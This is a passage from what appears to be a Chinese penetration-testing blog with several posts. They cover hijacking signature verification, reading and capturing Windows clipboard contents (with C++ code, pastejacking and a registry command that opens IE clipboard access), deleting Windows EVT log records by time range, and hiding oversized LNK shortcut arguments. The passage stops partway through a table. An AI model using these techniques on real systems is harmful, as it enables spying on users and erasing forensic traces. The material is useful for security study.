  <li>DllHost.exe - When the “Digital Signatures” tab is displayed in file properties</li>
  <li>Process Explorer - When the “Verified Signer” tab is displayed</li>
  <li>Autoruns</li>
  <li>Sigcheck</li>
  <li>consent.exe - Any time a UAC prompt is displayed</li>
  <li>signtool.exe</li>
  <li>smartscreen.exe</li>
  <li>Get-AuthenticodeSignature</li>
  <li>Set-AuthenticodeSignature</li>
  <li>Security vendor software that performs certificate validation based on calls to WinVerifyTrust.</li>
</ul>

<p><strong>注：</strong></p>

<p>该处引用自<a href="https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf">《Subverting Trust in Windows》</a> Page33</p>

<p>例如，查看文件属性-数字签名详细信息，加载dll，弹出计算器，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/4-1.png" alt="Alt text"></p>

<p>特别的，以管理员权限执行程序会弹出UAC，如果对此进行劫持，此时的权限为system</p>

<p>完整操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/4-2.gif" alt="Alt text"></p>

<h3 id="补充">补充：</h3>

<p><strong>1、dll劫持</strong></p>

<p>有些GUID，默认注册表的dll路径为相对路径，这里就存在dll劫持的问题，不需要修改注册表也能实现绕过签名验证</p>

<p><strong>2、Hiding from Autoruns</strong></p>

<p>启动项检测工具Autoruns默认不显示带有微软签名的文件，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-10/5-1.png" alt="Alt text"></p>

<p>如果文件包含微软签名，默认不会显示在Autoruns面板</p>

<h2 id="0x05-防御建议">0x05 防御建议</h2>
<hr>

<p>部分白名单程序默认会信任带有微软证书的文件，这里就存在隐患</p>

<p>建议不要盲目相信证书</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了Authenticode签名的相关利用技巧——PE文件的签名伪造与签名验证劫持，下一篇文章将继续介绍Authenticode签名的伪造技巧——针对文件类型的签名伪造。</p>

<p>最后感谢Matt Graeber的分享。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 10, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows下剪贴板的利用</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在Windows系统下，剪贴板是一个常见的功能，这其中有哪些可被利用的地方呢？本文将尝试整理这部分内容</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>写入剪贴板的方法</li>
  <li>读取剪贴板的方法</li>
  <li>利用思路</li>
</ul>

<h2 id="0x02-剪贴板简介">0x02 剪贴板简介</h2>
<hr>

<p>剪贴板是指windows操作系统提供的一个暂存数据和共享数据的模块，可理解为数据中转站</p>

<p>剪贴板的内容保存在内存中，所以系统重启后，保存的数据丢失</p>

<p>XP系统支持剪贴板查看器clipbrd.exe(Win7后移除)，可查看剪贴板内容</p>

<p>剪贴板查看器clipbrd.exe不需要安装，可直接在其他系统(例如Win7)下使用</p>

<p>复制数据后，在剪贴板查看器clipbrd.exe中实时显示复制的内容，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/2-1.png" alt="Alt text"></p>

<h2 id="0x03-写入剪贴板的方法">0x03 写入剪贴板的方法</h2>
<hr>

<h3 id="1ctrlc">1、Ctrl+C</h3>

<p>复制数据，或者通过快捷键<code class="language-plaintext highlighter-rouge">Ctrl+C</code>，数据保存到剪贴板中</p>

<h3 id="2cmd下的方法">2、cmd下的方法</h3>

<p>将<code class="language-plaintext highlighter-rouge">whoami</code>输出的内容复制到剪贴板上：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami|clip
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/2-2.png" alt="Alt text"></p>

<p>将<code class="language-plaintext highlighter-rouge">11.txt</code>的内容复制到剪贴板上：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clip&lt;11.txt
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/2-3.png" alt="Alt text"></p>

<h3 id="3程序调用api实现">3、程序调用API实现</h3>

<p>c++测试代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
BOOL CopyToClipboard(char* pszData)
{
    if(::OpenClipboard(NULL))
    {
        ::EmptyClipboard();
        HGLOBAL clipbuffer;
        char *buffer;
        clipbuffer = ::GlobalAlloc(GMEM_DDESHARE, strlen(pszData)+1);
        buffer = (char *)::GlobalLock(clipbuffer);
        strcpy_s(buffer,strlen(pszData)+1, pszData);
        ::GlobalUnlock(clipbuffer);
        ::SetClipboardData(CF_TEXT, clipbuffer);
        ::CloseClipboard();
        return TRUE;
    }
    return FALSE;
}
int main(int argc, char* argv[])
{
	CopyToClipboard("clipcopydatatest");
	return 0;
}
</code></pre></div></div>

<p>执行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/2-4.png" alt="Alt text"></p>

<h2 id="0x04-读取剪贴板的内容">0x04 读取剪贴板的内容</h2>
<hr>

<h3 id="1ctrlv">1、Ctrl+V</h3>

<p>粘贴数据，或者通过快捷键<code class="language-plaintext highlighter-rouge">Ctrl+V</code>，读取剪贴板中保存的数据</p>

<h3 id="2读取工具">2、读取工具</h3>

<p>剪贴板查看器clipbrd.exe</p>

<h3 id="3程序调用api实现-1">3、程序调用API实现</h3>

<p>c++测试代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
BOOL GetTextFromClipboard()
{
    if(::OpenClipboard(NULL))
    {
        
        HGLOBAL hMem = GetClipboardData(CF_TEXT);
        if(NULL != hMem)
        {
            char* lpStr = (char*)::GlobalLock(hMem); 
            if(NULL != lpStr)
            {
                printf("%s",lpStr);
                ::GlobalUnlock(hMem);
            }
        }
        ::CloseClipboard();
        return TRUE;
    }
    return FALSE;
}
int main(int argc, char* argv[])
{
	GetTextFromClipboard();
	return 0;
}
</code></pre></div></div>

<p>成功读取剪贴板内容，执行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/3-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>也可以模拟键盘输入<code class="language-plaintext highlighter-rouge">Ctrl+V</code>，获得剪贴板内容</p>

<h2 id="0x05-利用思路">0x05 利用思路</h2>
<hr>

<h3 id="1实时捕获剪贴板内容">1、实时捕获剪贴板内容</h3>

<p>渗透测试中，在取得系统控制权限后，会尝试读取用户的剪贴板内容，获得有价值的信息</p>

<p>而实际利用上，最好能够实时捕获剪贴板的内容，配合键盘记录，能够全面监控用户的登录输入内容</p>

<p>在程序实现上，可以加一个循环判断，如果剪贴板内容改变，就记录下来</p>

<h4 id="1-使用c读取当前系统的剪贴板信息">(1) 使用c++读取当前系统的剪贴板信息</h4>

<p>代码参考上节内容，加入循环判断，写入文件的功能，代码暂略</p>

<h4 id="2-使用powershell读取当前系统的剪贴板信息">(2) 使用powershell读取当前系统的剪贴板信息</h4>

<p>参考地址：</p>

<p>https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-ClipboardContents.ps1</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-1.png" alt="Alt text"></p>

<h3 id="2pastejacking">2、Pastejacking</h3>

<p>用作钓鱼网站，欺骗用户复制网址中的一段内容，劫持copyTextToClipboard事件，在复制的内容中加入恶意代码</p>

<p>复制内容<code class="language-plaintext highlighter-rouge">echo "not evil"</code>，实际剪贴板获得的内容为<code class="language-plaintext highlighter-rouge">echo "evil"</code></p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-2.png" alt="Alt text"></p>

<h3 id="3修改配置允许ie浏览器读取剪贴板内容">3、修改配置允许IE浏览器读取剪贴板内容</h3>

<p>页面内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;script type="text/javascript"&gt;
var content = clipboardData.getData("Text");
if (content!=null) 
{
	document.write(content);
}
else 
{
  	document.write('No text found in clipboard.');
}
&lt;/script&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>用户通过IE浏览器访问，默认情况下会弹框提示是否允许此网页访问剪贴板</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-3.png" alt="Alt text"></p>

<p>选择<code class="language-plaintext highlighter-rouge">允许访问</code>，网页获得剪贴板内容，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>Chrome、Firefox浏览器不允许通过getData访问用户的剪贴板内容</p>

<p>如果获得了用户系统的权限，可以修改IE配置，允许网页访问剪贴板</p>

<p>修改方式如下：</p>

<p><code class="language-plaintext highlighter-rouge">Internet选项</code> -&gt; <code class="language-plaintext highlighter-rouge">安全</code> -&gt; <code class="language-plaintext highlighter-rouge">自定义级别</code></p>

<p><code class="language-plaintext highlighter-rouge">设置</code> -&gt; <code class="language-plaintext highlighter-rouge">脚本</code> -&gt; <code class="language-plaintext highlighter-rouge">允许对剪贴板进行编程访问</code> -&gt; <code class="language-plaintext highlighter-rouge">启用</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-5.png" alt="Alt text"></p>

<p>对应注册表键值<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3</code>下的<code class="language-plaintext highlighter-rouge">1407</code></p>

<ul>
  <li>0表示允许</li>
  <li>1表示提示</li>
  <li>3表示禁止</li>
</ul>

<p>修改注册表设置允许访问剪贴板的命令为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" /v 1407 /t REG_DWORD /d 00000000 /f
</code></pre></div></div>

<p>重启IE浏览器后，配置生效</p>

<p>访问网页自动获得剪贴板内容，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-6.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了Windows系统下剪贴板在渗透测试中的相关利用技巧，通过实例演示后渗透阶段的利用方法</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February  1, 2018
  </div>

  
</article><article class="post">
  <h1>Windows Event Viewer Log (EVT)单条日志清除（二）——程序实现删除evt文件指定时间段的日志记录</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows Event Viewer Log (EVT)单条日志清除系列文章的第二篇，介绍删除evt文件指定时间段日志记录的思路，解决在程序设计上需要考虑的多个问题，开源实现代码。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>对指定evt文件指定时间段日志记录的删除思路</li>
  <li>程序实现细节</li>
  <li>开源代码</li>
</ul>

<h2 id="0x02-删除evt文件指定时间段日志记录的思路">0x02 删除evt文件指定时间段日志记录的思路</h2>
<hr>

<p>对比之前文章中提到的evtx文件单条日志删除方法，evt文件无法使用相同的思路</p>

<p>这是因为evt的文件结构中不包括唯一值EventRecordID，也就无法定位到指定的日志</p>

<p>经过分析，发现可以选择日志的创建时间作为输入项，指定起始日期和结束日期，删除这个时间段内的日志内容</p>

<p>而日志创建时间的格式为time_t类型，这里需要做一个考虑time_t类型和格林威治标准时间（Greenwich Mean Time，GMT）之间的转换</p>

<p>在程序实现上，思路如下：</p>

<ul>
  <li>遍历所有日志，过滤掉符合删除条件的日志，保存剩下的日志内容</li>
  <li>筛选完成后，后续日志的Record number作减法，减去删除的日志条数</li>
  <li>更新file header中的End of file record offset，Last (newest) record number和Maximum file size</li>
  <li>更新end of file record中的End of file record offset和Last (newest) record number</li>
</ul>

<h2 id="0x03-time_t类型和格林威治标准时间greenwich-mean-timegmt之间的转换">0x03 time_t类型和格林威治标准时间（Greenwich Mean Time，GMT）之间的转换</h2>
<hr>

<h3 id="calendar-time">Calendar Time</h3>

<p>日历时间，通过time_t数据类型表示</p>

<p>表示的是“相对时间”，能够避免受到时区的影响，不同时区的日历时间都相同</p>

<h3 id="time_t类型">time_t类型：</h3>

<p>本质上是一个长整数，表示从1970-01-01 00:00:00到目前计时时间的秒数</p>

<p>定义如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct tm
{
    int tm_sec;   // seconds after the minute - [0, 60] including leap second
    int tm_min;   // minutes after the hour - [0, 59]
    int tm_hour;  // hours since midnight - [0, 23]
    int tm_mday;  // day of the month - [1, 31]
    int tm_mon;   // months since January - [0, 11]
    int tm_year;  // years since 1900
    int tm_wday;  // days since Sunday - [0, 6]
    int tm_yday;  // days since January 1 - [0, 365]
    int tm_isdst; // daylight savings time flag
};
</code></pre></div></div>

<p>注意年份是相对于1900年</p>

<h3 id="coordinated-universal-timeutc">Coordinated Universal Time（UTC）</h3>

<p>协调世界时，又称为世界标准时间，即格林威治标准时间（Greenwich Mean Time，GMT）</p>

<p>存在时区的差别，计算本地时间需要考虑时差</p>

<p>类型转换的c代码实例如下：</p>

<p>Calendar Time转换成GMT：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;time.h&gt;
int main()
{
	__int64 CalTime = 1531788377;
	struct tm GmTime;
	char GmBuf[26];
	_gmtime64_s(&amp;GmTime, &amp;CalTime);
	strftime(GmBuf, 26, "%m/%d/%Y %r", &amp;GmTime);
	printf("GmTime   :%s\n", GmBuf);
	return 0;
}
</code></pre></div></div>

<p>Calendar Time转换成本地时间(考虑时差)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;time.h&gt;
int main()
{
	__int64 CalTime = 1531788377;
	struct tm LocalTime;
	char LocalBuf[26];
	_localtime64_s(&amp;LocalTime, &amp;CalTime);
	strftime(LocalBuf, 26, "%m/%d/%Y %r", &amp;LocalTime);
	printf("LocalTime:%s\n",LocalBuf);
	return 0;
}
</code></pre></div></div>

<p>时间转换成Calendar Time：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;time.h&gt;
time_t StringToDatetime(char *str)
{
	tm tm_;
	int year, month, day, hour, minute, second;
	sscanf_s(str, "%d-%d-%d %d:%d:%d", &amp;year, &amp;month, &amp;day, &amp;hour, &amp;minute, &amp;second);
	tm_.tm_year = year - 1900;
	tm_.tm_mon = month - 1;
	tm_.tm_mday = day;
	tm_.tm_hour = hour-1;
	tm_.tm_min = minute;
	tm_.tm_sec = second;
	tm_.tm_isdst = 0;
	time_t t_ = mktime(&amp;tm_);
	return t_;
}
int main()
{
	time_t sec = StringToDatetime("2018-7-16 17:46:17");
	printf("\n%ld\n", sec);
	return 0;
}
</code></pre></div></div>

<h2 id="0x04-程序实现细节">0x04 程序实现细节</h2>
<hr>

<h3 id="1结构体定义">1、结构体定义</h3>

<p>file header的定义可参考：</p>

<p>https://technet.microsoft.com/zh-cn/library/bb309024</p>

<p>event records的定义可参考：</p>

<p>https://technet.microsoft.com/zh-cn/library/aa363646</p>

<p>end of file record的定义可参考：</p>

<p>https://technet.microsoft.com/zh-cn/library/bb309022</p>

<p><strong>注：</strong></p>

<p>在程序实现上，为了避免重定义，我修改了event records的结构名</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _EVTLOGRECORD {
	DWORD Length;
	DWORD Reserved;
	DWORD RecordNumber;
	DWORD TimeGenerated;
	DWORD TimeWritten;
	DWORD EventID;
	WORD  EventType;
	WORD  NumStrings;
	WORD  EventCategory;
	WORD  ReservedFlags;
	DWORD ClosingRecordNumber;
	DWORD StringOffset;
	DWORD UserSidLength;
	DWORD UserSidOffset;
	DWORD DataLength;
	DWORD DataOffset;
} EVTLOGRECORD, *PEVTLOGRECORD;
</code></pre></div></div>

<h3 id="2筛选条件">2、筛选条件</h3>

<p>end of file record的TimeGenerated为固定结构，值为<code class="language-plaintext highlighter-rouge">0x33333333</code></p>

<p>在遍历过程中，如何遇到TimeGenerated为<code class="language-plaintext highlighter-rouge">0x33333333</code>，那么代表已经定位到end of file record，遍历结束</p>

<h3 id="3遍历方法">3、遍历方法</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>while (currentRecordPtr-&gt;TimeGenerated != 0x33333333)
{
		if (currentRecordPtr-&gt;TimeGenerated&lt;StartTimeNum || currentRecordPtr-&gt;TimeGenerated&gt;EndTimeNum)
		{		
			//not selected evt record,copy it
		}
		else
		{
			//delete record
		}
		currentRecordPtr = nextRecordPtr;
		nextRecordPtr = (PEVTLOGRECORD)((PBYTE)nextRecordPtr + nextRecordPtr-&gt;Length);
}
</code></pre></div></div>

<h3 id="4日志保存">4、日志保存</h3>

<p>通过读文件获得日志文件的完整内容，保存在数组中</p>

<p>如果删除中间的日志内容，需要删除数组中间某一段的内容</p>

<p>这里选择新定义一个数组，在遍历过程中，只复制满足条件的日志</p>

<p>我选择了使用<code class="language-plaintext highlighter-rouge">memcpy</code>优点是第一个参数可以指定起始地址</p>

<h3 id="5删除日志计数">5、删除日志计数</h3>

<p>统计删除日志的总数，后续日志的Record number作减法，减去已删除日志的总数</p>

<p>event records和end of file record的Last (newest) record number作减法，减去已删除日志的总数</p>

<p>完整代码已开源，下载地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evt–General/blob/master/evtDeleteRecordofFile.cpp</p>

<p>sys1.evt下载地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evt–General/blob/master/sys1.evt</p>

<p>程序读取文件sys1.evt，删除指定时间<code class="language-plaintext highlighter-rouge">2018-7-16 17:46:17</code>至<code class="language-plaintext highlighter-rouge">2018-7-16 17:46:40</code>之间的日志，共4条</p>

<p>生成文件sys2.evt和sys3.evt</p>

<p>sys2.evt未去掉<code class="language-plaintext highlighter-rouge">trailing empty values</code></p>

<p>sys3.evt去掉<code class="language-plaintext highlighter-rouge">trailing empty values</code></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了删除evt文件指定时间段日志记录的思路和程序实现细节，开源代码，同evtx文件的删除方法存在很大区别</p>

<p>并且，删除当前系统指定指定时间段evt日志记录的方法同evtx也有很大区别，下篇将会详细介绍</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 15, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——快捷方式文件的参数隐藏技巧</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近，phrozensoft在博客中介绍了关于快捷方式的利用技巧，实现了将应用程序存储在快捷方式当中，当用户打开快捷方式时，通过vbs脚本释放应用程序并运行。</p>

<p>我对此很感兴趣，因为快捷方式的参数默认存在长度限制，最大为260，并且我在研究jsrat的过程也遇到过这个问题(最后通过调用sct文件解决了长度限制问题)</p>

<p>phrozensoft分享了Delphi格式的POC代码，本文将要对其进行测试，研究lnk的文件格式，开发出对应powershell实现的POC代码，简单分析该技术的利用和防御方法</p>

<p>phrozensoft博客地址：</p>

<p>https://www.phrozensoft.com/2016/12/shortcuts-as-entry-points-for-malware-poc-part-2-19</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<h3 id="delphi">Delphi</h3>

<p>是Windows平台下著名的快速应用程序开发工具</p>

<p>Borland公司研发</p>

<p>也可以在LINUX平台上开发应用，其在LINUX上的对应产品Kylix</p>

<p>常用版本：</p>

<ul>
  <li>Borland Delphi 7</li>
  <li>Delphi 2010</li>
</ul>

<h2 id="0x02-delphi-poc测试">0x02 Delphi POC测试</h2>
<hr>

<p>phrozensoft博客中也分享了其他功能的poc，如生成lnk文件的python脚本，本文暂不介绍，只测试其中的Delphi POC</p>

<p><strong>环境搭建：</strong></p>

<p>测试系统：Win7 x86</p>

<p>Delphi版本：Delphi 2010</p>

<p><strong>注:</strong></p>

<p>使用Delphi 7会存在编译不通过的错误，提示<code class="language-plaintext highlighter-rouge">“File not found System.sysutils.dcu”</code>
换用Delphi 2010后，poc作细微修改编译通过</p>

<h3 id="1新建工程">1.新建工程</h3>

<p>打开Delphi 2010</p>

<p>选择File-New-Other-Console Application</p>

<p>直接复制poc代码，提示错误，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/2-1.png" alt="Alt text"></p>

<h3 id="2修改poc">2.修改poc</h3>

<p>经测试，System.SysUtils需要更改为SysUtils</p>

<p>编译通过，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/2-2.png" alt="Alt text"></p>

<h3 id="3编译">3.编译</h3>

<p>选择Project-Build All Projects</p>

<p>如图，编译成功，生成Project1.exe</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/2-3.png" alt="Alt text"></p>

<h3 id="4测试">4.测试</h3>

<p>新建test.txt,填入超过260个字符的数据：</p>

<p><code class="language-plaintext highlighter-rouge">echo 123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678</code></p>

<p>cmd下执行如下命令：</p>

<p><code class="language-plaintext highlighter-rouge">Project1.exe test.txt test.lnk</code></p>

<p>生成test.lnk</p>

<p>查看命令行参数，只能看到长度为260的字符串，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/2-4.png" alt="Alt text"></p>

<p>然而，lnk文件的大小为2.45kb，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/2-5.png" alt="Alt text"></p>

<p>(看起来我们发现了有趣的地方)</p>

<p>cmd下打开test.lnk，lnk文件的参数正常执行，显示的字符超过超过260个，没有被截断，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/2-6.png" alt="Alt text"></p>

<p>使用16进制编辑器Hex Editor查看lnk文件格式，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/2-7.png" alt="Alt text"></p>

<p><strong>注:</strong></p>

<p>无法使用UltraEdit，UltraEdit打开lnk文件默认会打开lnk指向的文件
实例如图，指向cmd.exe</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/2-8.png" alt="Alt text"></p>

<h2 id="0x03-lnk文件格式介绍">0x03 Lnk文件格式介绍</h2>
<hr>

<h3 id="1整体结构">1、整体结构</h3>

<ul>
  <li>文件头</li>
  <li>Shell Item Id List段</li>
  <li>文件位置信息段</li>
  <li>描述字符段</li>
  <li>相对路径段</li>
  <li>工作目录段</li>
  <li>命令行段</li>
  <li>图标文件段</li>
  <li>附加信息段</li>
</ul>

<h3 id="2文件头结构">2、文件头结构</h3>

<p>1.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">偏移</th>
      <th style="text-align: center">长度</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">0h</td>
      <td style="text-align: center">4字节</td>
      <td style="text-align: center">固定值，字符为L</td>
    </tr>
  </tbody>
</table>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/3-1.png" alt="Alt text"></p>

<p>2.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">偏移</th>
      <th style="text-align: center">长度</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">4h</td>
      <td style="text-align: center">4字节</td>
      <td style="text-align: center">GUID</td>
    </tr>
  </tbody>
</table>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/3-2.png" alt="Alt text"></p>

<p>3.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">偏移</th>
      <th style="text-align: center">长度</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">14h</td>
      <td style="text-align: center">4字节</td>
      <td style="text-align: center">属性标志位</td>
    </tr>
  </tbody>
</table>

<p>将该四字节以二进制表示，如果0-6位为1，分别代表该lnk文件包含以下属性：</p>

<p>0位 有shell item id list
1位 指向文件或文件夹 
2位 存在描述字符串
3位 存在相对路径
4位 存在工作路径
5位 存在命令行参数
6位 存在自定义图标</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/3-3.png" alt="Alt text"></p>

<p>偏移14h，取4字节为000000f5,二进制表示为<code class="language-plaintext highlighter-rouge">11110101</code></p>

<p>0、2、4、5、6位为1，对应包含如下属性：</p>

<ul>
  <li>有shell item id list</li>
  <li>存在描述字符串</li>
  <li>存在工作路径</li>
  <li>存在命令行参数</li>
  <li>存在自定义图标</li>
</ul>

<p>4.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">偏移</th>
      <th style="text-align: center">长度</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">18h</td>
      <td style="text-align: center">4字节</td>
      <td style="text-align: center">目标文件属性</td>
    </tr>
    <tr>
      <td style="text-align: center">1ch</td>
      <td style="text-align: center">8字节</td>
      <td style="text-align: center">文件创建时间</td>
    </tr>
    <tr>
      <td style="text-align: center">24h</td>
      <td style="text-align: center">8字节</td>
      <td style="text-align: center">文件修改时间</td>
    </tr>
    <tr>
      <td style="text-align: center">2ch</td>
      <td style="text-align: center">8字节</td>
      <td style="text-align: center">文件最后一次访问时间</td>
    </tr>
    <tr>
      <td style="text-align: center">34h</td>
      <td style="text-align: center">4字节</td>
      <td style="text-align: center">目标文件长度</td>
    </tr>
    <tr>
      <td style="text-align: center">38h</td>
      <td style="text-align: center">4字节</td>
      <td style="text-align: center">自定义图标个数</td>
    </tr>
    <tr>
      <td style="text-align: center">3ch</td>
      <td style="text-align: center">4字节</td>
      <td style="text-align: center">窗口执行方式：1.正常2.最小化3.最大化</td>
    </tr>
    <tr>
      <td style="text-align: center">40h</td>
      <td style="text-align: center">4字节</td>
      <td style="text-align: center">热键</td>
    </tr>
  </tbody>
</table>

<h3 id="3shell-item-id-list">3、shell item id list</h3>

<p>由14h位置得出test.lnk存在shell item id list，所以从4ch开始的第一个段为shell item id list</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">偏移</th>
      <th style="text-align: center">长度</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">4ch</td>
      <td style="text-align: center">2字节</td>
      <td style="text-align: center">shell item id list总长度</td>
    </tr>
  </tbody>
</table>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/3-4.png" alt="Alt text"></p>

<p>shell item id list总长度为0129</p>

<p>下一段（描述字符串）的起始地址为004e+0129=0177h</p>

<h3 id="4描述字符串">4、描述字符串</h3>

<table>
  <thead>
    <tr>
      <th style="text-align: center">偏移</th>
      <th style="text-align: center">长度</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">004e+0129=0177h</td>
      <td style="text-align: center">2字节</td>
      <td style="text-align: center">长度（Unicode），实际长度要乘以2</td>
    </tr>
  </tbody>
</table>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/3-5.png" alt="Alt text"></p>

<p>描述字符串长度为000c（Unicode）</p>

<p>下一段（工作路径）的起始地址为0177+2+000c×2=0191h</p>

<h3 id="5工作路径">5、工作路径</h3>

<table>
  <thead>
    <tr>
      <th style="text-align: center">偏移</th>
      <th style="text-align: center">长度</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">0177+2+000c×2=0191h</td>
      <td style="text-align: center">2字节</td>
      <td style="text-align: center">长度（Unicode），实际长度要乘以2</td>
    </tr>
  </tbody>
</table>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-31/3-6.png" alt="Alt text"></p>

<p>工作路径长度为0012（Unicode）</p>

<p>下一段（命令行参数）的起始地址为0191+2+0012×2=01b7h</p>

<h3 id="6命令行参数">6、命令行参数</h3>

<table>
  <thead>
    <tr>
      <th style="text-align: center">偏移</th>
      <th style="text-align: center">长度</th>
      <th style="text-align: center">说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
